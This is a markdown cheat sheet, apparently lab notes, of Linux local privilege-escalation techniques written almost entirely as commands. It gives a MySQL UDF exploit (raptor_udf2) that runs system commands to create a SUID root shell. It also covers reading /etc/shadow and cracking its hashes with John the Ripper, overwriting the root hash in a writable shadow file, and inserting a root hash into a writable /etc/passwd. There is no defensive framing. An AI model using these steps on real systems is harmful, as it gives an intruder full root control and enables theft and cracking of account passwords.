

# 💻 <span style="color:#1E90FF">**SQL Exploit**</span>


###  **Change into the MySQL Directory:**

```bash
cd /home/user/tools/mysql-udf
```

---

###  **Compile the `raptor_udf2.c` Exploit Code:**

```bash
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

---

###  **Connect to the MySQL Service as the Root User (No Password):**

```bash
mysql -u root
```

---

###  **Create a User Defined Function (UDF) "do_system" Using the Compiled Exploit:**

```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

---

###  **Copy `/bin/bash` to `/tmp/rootbash` and Set the SUID Permission:**

```sql
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

---

###  **Exit from the MySQL Shell:**

```bash
exit
```

---

###  **Run `/tmp/rootbash` with Root Privileges:**

```bash
/tmp/rootbash -p
```

---

###  **Clean Up and Exit from Root:**

```bash
rm /tmp/rootbash
exit
```



# 🛡️ <span style="color:#32CD32">**Weak File Permissions (Readable shadow file)**</span>


## **Check the Permissions of the `shadow` File**

```bash
ls -l /etc/shadow
```

---

## **Show the Hash of the Root Password**

```bash
cat /etc/shadow
```

---

## **Crack the Hash with John the Ripper (Dictionary Attack)**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

---

## **Privilege Escalation**

```bash
sudo su
```



# 🔓 **Weak File Permissions (Writable Shadow File) Exploit**



##   **Check the Permissions of the Shadow File**

Ensure the shadow file is writable:

```bash
ls -l /etc/shadow
```

---

##   **Generate a New Password Hash**

To create a password hash with your chosen password, use the following command:

```bash
mkpasswd -m (hashing algorithm) newpass
```

For example, to use **SHA-512**, the command would be:

```bash
mkpasswd -m sha-512 newpass
```

---

##  **Edit the Shadow File and Replace the Root Password Hash**

1. Open the **shadow** file with elevated privileges using a text editor like `nano` or `vi`:

```bash
nano /etc/shadow
```

2. Find the **root** entry in the shadow file.  
3. Replace the old hash with your newly generated password hash.

---

##   **Gain Root Privileges**

After replacing the password hash, escalate your privileges with:

```bash
sudo su
```

# 🌐 Weak File Permissions (Writable passwd File)



## **Check the Permissions of the `/etc/passwd` File**

First, verify that the `/etc/passwd` file is world-writable:

```bash
ls -l /etc/passwd
```

Look for a **w** in the third section of the file permissions (e.g., `-rw-rw-rw-`).

---

## **Generate a New Password Hash**

Generate a new password hash for a password of your choice using the **openssl** command:

```bash
openssl passwd newpasswordhere
```

This will output a hashed password that you can use in the next step.

---

## **Edit the `/etc/passwd` File**

Open the `/etc/passwd` file using a text editor like `nano`:

```bash
nano /etc/passwd
```

---

## **Replace or Add a Password Hash for Root**

- **Replace the Root User's Password Hash**:  
  Find the **root** user's row (the first row in the file) and replace the **x** between the first and second colon (`:`) with the newly generated password hash.

  **Before:**

  ```
  root:x:0:0:root:/root:/bin/bash
  ```

  **After:**

  ```
  root:$6$abcde$hashgoeshere:0:0:root:/root:/bin/bash
  ```

---

## **Switch to the Root**

 use the new password to switch to the root user:

```bash
su root
```
